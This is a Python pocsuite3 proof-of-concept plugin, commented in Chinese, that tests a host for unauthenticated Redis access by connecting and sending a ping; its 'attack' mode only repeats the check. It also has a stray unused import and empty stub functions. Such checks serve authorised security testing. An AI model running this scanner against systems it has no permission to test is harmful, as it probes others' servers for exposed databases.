from lxml.html.formfill import _check
from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,
)
import redis


class REDISUNAUTHORIZED(POCBase):
    vulID = "0"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "derian"  # PoC作者的大名
    vulDate = "2021-11-11"  # 漏洞公开的时间,不知道就写今天
    createDate = "2021-11-11"  # 编写 PoC 的日期
    updateDate = "2021-11-11"  # PoC 更新的时间,默认和编写时间一样
    references = [""]  # 漏洞地址来源,0day不用写
    name = "redis未授权访问"  # PoC 名称
    appPowerLink = ""  # 漏洞厂商主页地址
    appName = "redis"  # 漏洞应用名称
    appVersion = "all"  # 漏洞影响版本
    vulType = VUL_TYPE.UNAUTHORIZED_ACCESS  # 弱口令 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # poc对应的产品类型 web的
    # samples = []  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """reids未授权访问,可以直接控制别人的redis"""  # 漏洞简要描述
    pocDesc = """直接登录即可"""  # POC用法描述

    def _check(self):
        # 漏洞验证代码
        result = []
        host = str(self.target).split(":")[0]
        port = str(self.target).split(":")[-1]
        try:
            # 使用连接池进行连接,设置了个超时
            pool = redis.ConnectionPool(host=f'{host}', port=f'{port}',socket_connect_timeout=5)
            red = redis.Redis(connection_pool=pool)
            # 验证是否连接成功使用ping()
            red.ping()
            print(f'[+] {host}:{port}连接成功!存在未授权访问')
            result.append(f'[+] {host}:{port}')
        except Exception:
            print(f'[-] {host}:{port}连接失败,可能原因:不存在未授权访问/未使用redis')
        finally:
            return result

    def _verify(self):
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.desc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def open_file():
    pass

def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(REDISUNAUTHORIZED)
